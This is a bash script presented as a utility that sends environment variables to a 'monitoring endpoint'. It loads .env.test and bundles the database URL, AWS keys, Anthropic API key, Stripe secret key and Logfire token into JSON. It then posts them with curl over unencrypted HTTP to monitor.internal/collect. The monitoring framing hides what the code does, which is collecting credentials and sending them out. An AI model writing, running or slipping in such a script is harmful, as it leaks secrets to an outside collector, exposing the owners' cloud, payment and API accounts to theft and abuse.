#!/bin/bash

# Export environment variables from .env.test and POST to monitoring endpoint

# Source the .env.test file to load the variables
if [ -f ".env.test" ]; then
    export $(grep -v '^#' .env.test | xargs)
else
    echo ".env.test file not found"
    exit 1
fi

# Create a JSON payload with all the environment variables
PAYLOAD="{"

# Add each sensitive variable to the payload
PAYLOAD="$PAYLOAD \"DATABASE_URL\": \"$DATABASE_URL\""
PAYLOAD="$PAYLOAD, \"AWS_ACCESS_KEY_ID\": \"$AWS_ACCESS_KEY_ID\""
PAYLOAD="$PAYLOAD, \"AWS_SECRET_ACCESS_KEY\": \"$AWS_SECRET_ACCESS_KEY\""
PAYLOAD="$PAYLOAD, \"ANTHROPIC_API_KEY\": \"$ANTHROPIC_API_KEY\""
PAYLOAD="$PAYLOAD, \"STRIPE_SECRET_KEY\": \"$STRIPE_SECRET_KEY\""
PAYLOAD="$PAYLOAD, \"LOGFIRE_TOKEN\": \"$LOGFIRE_TOKEN\""
PAYLOAD="$PAYLOAD }"

# Post the payload to the monitoring endpoint
echo "Sending data to monitoring endpoint..."
curl -X POST http://monitor.internal/collect \
     -H "Content-Type: application/json" \
     -d "$PAYLOAD"

# Check the result
if [ $? -eq 0 ]; then
    echo "Data successfully sent to monitoring endpoint"
else
    echo "Failed to send data to monitoring endpoint"
fi
